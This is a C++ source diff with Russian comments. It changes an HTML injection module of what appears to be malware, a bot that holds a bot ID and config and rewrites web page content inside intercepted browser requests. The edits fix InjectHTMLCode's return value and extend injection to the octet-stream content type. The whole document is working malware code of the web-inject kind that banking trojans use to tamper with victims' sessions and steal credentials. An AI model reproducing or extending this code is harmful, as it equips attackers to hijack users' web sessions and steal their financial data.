@@ -52,7 +52,7 @@ void CallHTMLInjectEvent(LPVOID Sender, THTMLInjectEventID ID, LPVOID Reserved)
 {
 	// Вызываем событие инжекта
 	if (InjectEvent != NULL) {
-		InjectEvent(InjectEventData, Sender, ID, Reserved);
+		InjectEvent(InjectEventData, Sender, ID, Reserved); 
 	}
 }
 
@@ -691,7 +691,7 @@ void Config::Clear(TBotConfig* Config)
 		Config = BotConfig;
 	if (Config)
 	{
-		Config->Clear();
+		Config->Clear();   
     }
 }
 
@@ -725,7 +725,7 @@ bool SubstitudeText2(PCHAR Buffer, PCHAR &NewBuffer, PCHAR Before,
 
 	//DWORD BufferLen = StrCalcLength(Buffer);
 
-	PCHAR AfterPtr = NULL;
+	PCHAR AfterPtr = NULL; 
 	// Ищем блок Before
 	if (B)
 	{
@@ -883,6 +883,8 @@ bool InjectHTMLCode(PRequest Request, THTMLInject *Inject)
 
     THTMLInjectData Data(NULL);
 
+	bool Result = false;
+
 	for (DWORD i = 0; i < Count; i++)
 	{
 	   	THTMLInjectData *SourceData = Inject->Items(i);
@@ -949,6 +951,7 @@ bool InjectHTMLCode(PRequest Request, THTMLInject *Inject)
 		if (Injected)
 		{
         	// Инжект сработал, обрабатываем данные
+			Result = true;
 			Request::SetBuffer(Request, (LPBYTE)NewBuffer, NewLen);
 
 			SourceData->State = idsOk;
@@ -966,7 +969,7 @@ bool InjectHTMLCode(PRequest Request, THTMLInject *Inject)
 
 	STR::Free(BotID);
 
-	return Injected;
+	return Result;
 
 }
 
@@ -1017,7 +1020,8 @@ bool CheckContentType(PCHAR CType, PCHAR *Types)
 	return false;
 }
 
-bool HTMLInjects::SupportContentType(PCHAR CType) {
+bool HTMLInjects::SupportContentType(PCHAR CType) 
+{
 	// Функция возвращает истину если указанный тип контента
 	// поддерживается методами инжекта HTML
 	if (CType == NULL)
@@ -1039,6 +1043,7 @@ bool HTMLInjects::SupportContentType(PCHAR CType) {
 					  "application/javascript",
 					  "application/xml",
 					  "application/xhtml+xml",
+					  "application/octet-stream", 
 						NULL};
 
 
